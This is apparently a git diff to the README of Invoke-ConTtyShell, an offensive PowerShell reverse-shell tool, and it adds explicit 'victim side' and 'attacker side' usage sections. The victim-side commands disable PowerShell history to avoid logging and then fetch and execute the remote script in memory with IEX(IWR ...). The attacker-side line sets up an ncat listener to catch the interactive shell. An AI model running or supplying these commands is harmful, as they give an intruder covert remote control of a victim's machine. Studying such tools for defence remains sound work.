@@ -5,7 +5,7 @@
 Tested on:
 Windows 10 22H2 x64
 
-Usage:
+Victim side usage:
 
 ```
 Set-PSReadlineOption -HistorySaveStyle SaveNothing
@@ -24,4 +24,9 @@ Set-PSReadlineOption -HistorySaveStyle SaveNothing
 IEX(IWR -UseBasicParsing -UserAgent "hi-there-blueteam" 'https://raw.githubusercontent.com/ricardojba/Invoke-ConTtyShell/main/Invoke-ConTtyShell.ps1')
 
 Invoke-ConTtyShell -Command "-h"
+```
+
+Attacker side usage:
+```
+stty raw -echo; (stty size; cat) | ncat -lvnp 6666
 ```
